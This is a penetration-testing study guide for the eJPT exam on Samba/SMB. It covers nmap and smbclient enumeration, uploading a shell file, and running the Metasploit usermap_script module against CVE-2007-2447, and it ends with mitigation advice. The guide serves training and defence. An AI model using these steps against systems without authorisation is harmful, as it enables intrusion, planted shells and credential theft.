# Introduction

Samba is the Linux implementation of the SMB (Server Message Block) protocol. It allows Linux systems to share files and printers with Windows machines.

Samba services are commonly found during penetration tests and are frequently included in the **eJPT** exam.

Misconfigured or outdated Samba servers may expose:

- Anonymous shares
- Sensitive files
- User information
- Writable shares
- Remote Code Execution vulnerabilities

Always enumerate thoroughly before attempting exploitation.

---

# What is Samba?

Samba implements Microsoft's SMB protocol on Unix/Linux systems.

Typical uses include:

- File sharing
- Printer sharing
- Domain authentication
- Active Directory integration

Common ports:

| Port | Protocol | Service |
|------|----------|---------|
| 139 | TCP | NetBIOS |
| 445 | TCP | SMB |

---

# Identifying Samba

Use Nmap version detection.

```bash
nmap -sV -p139,445 TARGET
```

Example:

```
445/tcp open  microsoft-ds

Samba smbd 3.0.20-Debian
```

The version number is important because older releases may be vulnerable to public exploits.

# Nmap Enumeration

Basic scan:

```bash
nmap -sV -p445 TARGET
```

SMB scripts:

```bash
nmap --script smb* TARGET
```

Operating system detection:

```bash
nmap --script smb-os-discovery TARGET
```

Shares:

```bash
nmap --script smb-enum-shares TARGET
```

Users:

```bash
nmap --script smb-enum-users TARGET
```

Protocols:

```bash
nmap --script smb-protocols TARGET
```

# SMB Client Enumeration

List available shares:

```bash
smbclient -L //TARGET/ -N
```

If credentials are available:

```bash
smbclient -L //TARGET/ \
-U administrator
```

Connect to a share:

```bash
smbclient //TARGET/Public -N
```

Useful commands:

```
ls

cd

pwd

get file.txt

put shell.php

mget *

exit
```

Enable recursive downloads:

```
recurse ON

prompt OFF

mget *
```



# Samba Username Map Script (CVE-2007-2447)

One of the most famous Samba vulnerabilities.

Affected versions:

```
Samba 3.0.20

and older
```

Search:

```bash
searchsploit username map script
```

Metasploit module:

```
exploit/multi/samba/usermap_script
```

Usage:

```text
use exploit/multi/samba/usermap_script

set RHOSTS TARGET

run
```

If successful:

```
Meterpreter session opened
```

This vulnerability appears frequently in beginner labs and is worth remembering for the eJPT.

# Common Mistakes

## Ignoring Anonymous Access

Always test:

```bash
smbclient -L //TARGET/ -N
```

Many labs intentionally allow guest access.

---

## Ignoring Version Detection

Without the version number, you may miss known exploits.

Always use:

```bash
nmap -sV
```

---

## Forgetting Searchsploit

Always search for public exploits before attempting manual attacks.

```bash
searchsploit samba
```

---

## Missing Writable Shares

Writable shares may allow:

- Web shells
- Reverse shells
- Privilege escalation
- Credential theft

Test write permissions whenever possible.

---

# Defense & Mitigation

Protect Samba by:

- Updating Samba regularly
- Disabling anonymous access
- Restricting writable shares
- Using strong authentication
- Removing unnecessary shares
- Restricting firewall access
- Disabling SMBv1
- Auditing share permissions
